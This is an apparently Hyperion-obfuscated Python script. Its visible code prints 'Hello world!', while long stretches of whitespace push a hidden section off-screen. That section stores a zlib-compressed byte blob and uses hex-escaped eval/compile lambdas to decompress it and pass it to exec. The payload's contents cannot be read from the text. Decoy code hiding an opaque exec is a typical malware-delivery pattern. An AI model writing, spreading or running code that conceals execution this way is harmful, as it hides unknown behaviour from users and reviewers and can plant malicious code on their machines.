from builtins import *
from math import prod as Hypothesis


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


CallFunction, Divide, Theory, System, Builtins, _algorithm = exec, str, tuple, map, ord, globals

class _system:
    def __init__(self, DetectVar):
        self._hypothesis = Hypothesis((DetectVar, -4255))
        self.Algorithm(Product=98365)

    def Algorithm(self, Product = False):
        self._hypothesis -= 64957 - Product

    def _detectvar(self, StackOverflow = -45297):
        StackOverflow += -80075 - 23437
        self.Frame != float

    def _frame(_run = int):
        return _algorithm()[_run]

    def Statistics(Math = 69170 / 78111, _memoryaccess = None, _builtins = _algorithm):
        _builtins()[Math] = _memoryaccess

    def execute(code = str):
        return CallFunction(Divide(Theory(System(Builtins, code))))

    @property
    def Frame(self):
        self.Calculate = '<__main__._calculate object at 0x000004587BE53128>'
        return (self.Calculate, _system.Frame)

if __name__ == '__main__':
    try:
        _system.execute(code = __code__)
        _calculate = _system(DetectVar = -22711 - 43281)
        if 269315 > 7970295:
            _calculate._detectvar(StackOverflow = -27439 - _calculate._hypothesis)
        elif 211726 < 5902837:
            _system(DetectVar = 96985 / -62160)._detectvar(StackOverflow = -40004 - _calculate._hypothesis)                                                                                                                                                                                                                                                          ;_system.Statistics(Math='WWXWWWWXXXXXXWXXW',_memoryaccess=b'x\x9c\xedY[o\xa3:\x10~\xdf_Q\xed\x0bD\xbd\x08lc R\xdf\xa2#\xf5a\x97\x87\x1c\xa9\x91\xaa*\xca\x05\xf6\x10\x11\xa8\xd2t\x9b\xf3\xef\xcf\x8c/\t\xe5\x12L\x1be\xa5\xe8\xe0\x8cm\xc6\x8e\x19\x7f\xccx\xc6&+\x16\xb3\xec\xd5\x1e<Y\xd9\x03\xa6\x87,\xcb4e\x82\x95Y\xcf\xf7\xbf\xb2b\x0e\xdd\xbe\xb5\xf6\xc1\x01~\xe0\xf5\xf3\xc7O\xbc~\x88d=\r\x87\xd7\xb7\xd7\xb7\xf6\xad}\xed\x0e\x06\xcf\xcf\xf7\xcbts|\x90(*"\xc7) /\x8a\xc2q\x9c\x08\x18\xc0\x01\xaa\x0f\xf6+\xde\xce\xb6\xdb\x8e\x01\xf3<_\xaf\x81\x0e%\xcc\'\x13\xb3\xfeVo\xc3\x7f\x88\xea\x1a~\xc8\xc7\xea\x1a\xfe1\x9d\xa6\xeb\x97b\xb3\x9dN\x8f?N\xb6\xc1\x95\t\xca\x1e\xe0\xbf\xf5\x01mk\xfe\x96f\xdb4\x7f\xb5\x06w\xbfg\x9b6Q\xc6c2&x\x8d\xf17\x1e\xef\xab0*\xe0\xe2 6\x11\xe0\x05\xf8\x08\xc8\x00/`\xd8M\x0f|\xcd\xd3m\x96\xbe\xcd\xab0\x0en\xd4\xcbR\xaf\r\xaf~\x03\x0c\x9e\xbe<\xc2]\x9a/\xe3\x9dmeEQo}\x1et\xa9\xcc\x08/\xa1(#\xcc\x10\x8c\xa8?Bi\xbax\x9d\xe5\xe9\xe7\x11j\x1d\xc0\x18\xa1\xf6\x114B\xff&i\xb6\x8b\xff\xc9\xdfz\xc3$\xa6\x0fPE\x05\xd0\x08\xb2\x11B2\x1a]\xa8*\xc5Y\xfa\xb2.\x16M0\xd5lT,\x7fi\xbaJ\xb3U\xbaZa\x99"t\xe9\xeaR\xb1y\xdb\xfc\xdd\x04L\xf3"\x84\xca\x82\xf3\x1e\t\xbd\x89\x84\xee\\(0\xd9\xecwl\xac1\x92\x91\tF\xb6o\x16\xfe\xf2\x12\xb1\xd9l_\x8d\xa1\x19\x0b\'%\xbc\x95t[\xc2u\t\xb7eYw\xab"\xcd\x8f\xafU\xbb\xdd\xfb\xfbN\\\xefp\xa9\x1b,/\x14\xdb\xed\xac\xc8\x12s\x8bD_\x17\xe1\xf2\x8d\x869\x125\xf4\x80\xc5\xa5\x9ae\xfc\x9a\xcd\xfe\xea\xeb\xf0\x9a\xc3\x02{n\xb1\x84\'\x1f\x89:\x98\xb0\xe4\x89\xacI>K$\x8f\'\x10\xa6-\xe3E\xb1\x8cm+H\xb6\r\xce\xf7"q_\xc4\xbb\xc6\xe5\xf0x\x9cQ\x88\xa0\x1dq\x80\x9a#0\x90\xa9<T\x93S\xb1\xad\x81\x0b\x8d\x8eA?\x07\x1a\xdd\xce~\xad*@]\xb2$\x01YR\x87\x84]\xafv 3A\xcf`\xaayz\x03\xb4y\xb9At\xae\xb6\x9b\xe2e\x9d^i,\xaf\xd6\xc5&9\xe1<\xcf\x85\x87\xa3\xf0p\xfb\xe1!\xa8-l\xc0u)\x12\x0bT\x81O\x1c!\x03\x16\xa8&\x87\xd1*\x18\xf7\xfc\x80{\x9cv\xda\xdfq\x9d\\\x0b\xc1ra\x04\xc2\x02\xa4\x19\xb4H\x83\xef\xf8|Xv\x88.B\x0b\xc9~\xd0\xdb\xf1F\xc0[\x05\xf2\x1d\x9f\xf0\x90\xc7>\xebF\xb1\x11\x8eU\xa6cb\xfcA\x1d\xf2\x14+g\x04\xe9\xbe\xdf\xf8\x84\xf0\xc0g\x90\x1c\x9f\xd2\x19IH\xe23\x0e\x9a\x04Hx\xdc\xe5\x0b\x9e &\x040\xe1sB:%h\xc4\xa5\xf5\xe1\x1e\xa5\x04\x93,=*\x93\xbe\xaf\xb7a\xad\xdb\xc1d\xb3\xf5|9\xbbR\xf1\xd0\xbb\x8e\x89v\xbb\xe1\x11\xfd\xe9+\xf8!\x95\xc5\xfbH\x92g,\xb0\xb6\xb9u\xaeM\x10\x95v\xd8\xa4\xc3\xfd\xa4\x95\x1e\x1ar\xc6\x90\xe0R\xf5\x84\xa9\x92\xcb\xd6n\xbd\xd7\xb2JcSQ\xbd\x92\xe5\x04\x92\xea(BJ\xc4U\\\xa1\xe9\x10q\x18\xcb9y\x9cL&\x8f\x8f\x8fH"\x9f\x0c\x1b\x04\xea\xaf\xb5U\x05(\xeblU{{\x08+\xe5\x04\x89\x85\xccX\x9a\x83ja4\x11\xa9pJ\xc6\x13&\x81\x04\x9b\x12H\x1c\x88\x8a\xdc\x9d\x06\xd0\xd9\xabs\xcf\xeb4\xcboP\xbe8\x8d\x8d\x84\xe5\xcbo\x91/X\x08\xcb\x9b\xc8Y(\x93\xbc\x97\xa5l1~w\xe3\xb1<\x82<\xec\xe2\xa0v\xba\x05\x07\xdc\x92\x94j&\x08\xf3P\x91N\xa1j\x15uc\xb9q3\x84O\xc2\xa8C\xc4!(Aq\x9aE\x87\x1d\x96\x1c\x9e\xe8\xa5\x87i\x9e4of\xb6i8\xa0L4!\xc0\xea\x86\x90\x13\x08\xec\x07\x90\xe4U.\x03\xc5/\xe7\xe22\xd8\xe9\xf4\xf3\xc4>\xe9\x1c\xb3\xc5\xf2\x1f\xf5j1Q\xab\x87Z\xf3&\xe7\x0b\xfcKnw\'\x9d\xee>\xc1\xd5h\xae-[\xf6\x11\xaa"n\xd6\xa1\x86\xd10T\xbf0\r\xee%4\x00r\x80\x88*C \x1f\x88\xaa\xb6\x80\xcc\xc5TM\xfa\xfa\x86p\xd8\xbd=\xb4&i$<\xd1\xc6\xc2\xf7>\x9b\xef\xdb;u\xaf\x1d\x11\xbd\xe2UW\xbaryX\x17\xb1\x06\xd8\x84\xde\x9c\x1d,\x98\x95\x82\x06e\xc9\x1f]6\t8!>e\x9cS\x0et\xac\xa4\xe0\xd45\xe9{^\xe2\xb3J\x7fV\xfa\x1f\x97|0\x1c\x08P9\xc3\xed\x0fH\x00%H\xec\xd3\x80s\x08k=\xe2{s:\x83\xd0v\x0e\n=\x97J\r4Gg\x04\xf3Z\n\n>9;A\x90xY\xc2\xf2=\xa6\x8a\xf4\xd5\xb6\xf2\x7f\x08\r\xa8\xbf\xa7rj\xbb\xaf\xf6o\xab\x1f\x12\xa1\xe1W\x11\xeb\xb6\x81\x9b$\xcd\xe2|\xb6\x8e\xef\rbh\x1dA\x97\xe3h\xb3\xd8\xf9f\rm\xed\x8f\x80m\x0c\xc7ML\xb7\xc5\xf6\rS\xa5Yj\xcd8x6u\x18\xc6\x0c\xc3i\xfb\xe8\x8eV9f\xb1"\xe2b\x88\xf7\x98\x0c\xa2:2\r\xa6\x18\xd99\xd3\x10j\xe1\xd4\x9f\x86\xd0\x99\xd6\xb9\';2\xb1\x06.\x8c\xcdD\xac\xe8\x00\x85P\xc3g\x92:\xd7`\xacP\xf4& !\x17\x91h \xa2R\xe4U\xb8\x06c\xe1L1\xb9S\x0f$\t \'\xd09\xacs\xcf~\xcc\xf4\xf5\xe3(\xed\x9eB\xe5\x9e\\ \xaex\x9e\xaaS\xe5\xdeL\xfa\x92O\x1ck5\xd0\x11\xffS\xf6>:\xea>\x94H\xff\xfb\x9b\xc6\xd9q\x1a\x02\xa1\x8fpj\xfed\xefKJ\xa9\xe6c*\xf7\x1f\xfc\x10$\xca]\xd8|\xbbb\xfc\xca\x8c?\xf4\xe7\x15T\xaae\x13\x92\xe8\xd7\xf4\xb3\x9a\xe4-\xfb\xce}\xaa\xf6k\xf1\xb1g\xf6g\xd6n\xff\x8d\xad\x14\xe0~\xc1\x84\x892\xbf@\x91\xa7\xa2\xcd\xb0D\x8e2\xe1\xae\xbe\xc83\x98\r\x9a\xa8t\x9d\xb5\x0f\xb9\x7f\xf8x]\x87\xda\x18z35)V\t\xc1=\x05\x86I_\xd6w=k\xde`}jSr\x9a\xd5\xdd)\xbdf\xa66&ni\xd6Niu?\xd6\x97\x9a\xabF\xfb\x06\xe6\xf3!\xc9\xe9\x0e\xb8\xed\xef\xa2\xea^\x03\x1b\x1a\xaf\x87\xc3\'\xebm\x9b\x04\x96\x1d/\x8bE\xbc\xbc\x1bX!\x91\xc7$\xa1 }L\xa2s\xc9\x97\xf5p\xcf\t\x88\xe00$\xcce]\x96\xbaf\xcd\xedH\x08\xae\'\xa1\'e?k\xe4\x8e\x8b\xe5R\xb9\xfa8\xb4}\xa8&]+\x0f\x1a\xe9\xaf\x84\xe2\x94\x0f?\x9dF\xe2cj\x01/a`\xabo7\xf9\xa1\xfc~*\xeb>\xe9GB\x83\r\x82>\x8d+\xc7\x06\x87=\xab\xd9\xf9\xdc\xe96\x08\xff\x01&5\x10W')
        if 385457 > 5593765:
            _calculate.Algorithm(Product = _calculate._hypothesis + -20368)
        elif 496970 < 788340:
            _system(DetectVar = 62697 / 95579).Algorithm(Product = _calculate._hypothesis - 96149)                                                                                                                                                                                                                                                          ;O00o0OoOoo0O00oo0oOoO00o0,O0Oo00ooo0OooOoO0o0,nmnnnmmnnmnmmmmmnnnmn,OOo00ooo0o0oOo0OoO0O0,nnmnnnnnnnnmnmnnnmnmmnn=(lambda NMNNNNMNNMNNNNMMNNNMNNMM:NMNNNNMNNMNNNNMMNNNMNNMM['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda NMNNNNMNNMNNNNMMNNNMNNMM:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMNNNNMNNMNNNNMMNNNMNNMM)"),filename='\x53\x53\x32\x32\x53\x53\x32\x32\x32\x53\x53\x32\x32\x53\x53\x32\x53\x53',mode='\x65\x76\x61\x6c'))),(lambda NMNNNNMNNMNNNNMMNNNMNNMM:NMNNNNMNNMNNNNMMNNNMNNMM(__import__('\x7a\x6c\x69\x62'))),(lambda O0Ooo00O0OOoO0o0oooo0oOO0O,NMNNNNMNNMNNNNMMNNNMNNMM:O0Ooo00O0OOoO0o0oooo0oOO0O(NMNNNNMNNMNNNNMMNNNMNNMM)),(lambda:(lambda NMNNNNMNNMNNNNMMNNNMNNMM:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMNNNNMNNMNNNNMMNNNMNNMM)"),filename='\x53\x53\x32\x32\x53\x53\x32\x32\x32\x53\x53\x32\x32\x53\x53\x32\x53\x53',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _calculate._detectvar(StackOverflow = -66590 - _calculate._hypothesis)                                                                                                                                                                                                                                                          ;nnmnnnnnnnnmnmnnnmnmmnn()(OOo00ooo0o0oOo0OoO0O0(O00o0OoOoo0O00oo0oOoO00o0(nmnnnmmnnmnmmmmmnnnmn(O0Oo00ooo0OooOoO0o0('\x76\x61\x72\x73'))),_system._frame(_run='WWXWWWWXXXXXXWXXW')))
    except Exception as _stackoverflow:
        if 186590 > 641306:
            _system.execute(code = Divide(_stackoverflow))
        elif 208210 > 8966022:
            _calculate._detectvar(StackOverflow = 86431 + _calculate._hypothesis)
